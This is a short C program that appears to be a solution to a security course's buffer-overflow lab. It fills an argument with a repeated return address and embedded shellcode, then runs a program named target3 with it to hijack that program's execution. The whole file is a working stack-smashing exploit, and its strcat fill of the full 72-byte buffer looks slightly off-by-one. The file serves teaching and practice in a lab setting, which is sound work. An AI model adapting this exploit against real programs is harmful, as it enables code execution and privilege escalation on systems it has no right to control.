#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode-64.h"

#define TARGET "../targets/target3"
#define LENGTH 72
#define ADDR_LEN 4

int
main ( int argc, char * argv[] )
{
	char *	args[3];
	char *	env[1];

	char exploit[LENGTH] = "";

	// 1. buffer address
	int i = 0;
	while(i < LENGTH / ADDR_LEN){
		strcat(exploit, "\x54\xfe\x21\x30");
		i++;
	}
	// 2. shell code
	for(i = 0; i < strlen(shellcode); i++){
		exploit[i] = shellcode[i];
	}

	args[0] = TARGET;
	args[1] = exploit;
	args[2] = NULL;

	env[0] = NULL;

	if ( execve (TARGET, args, env) < 0 )
		fprintf (stderr, "execve failed.\n");

	return (0);
}
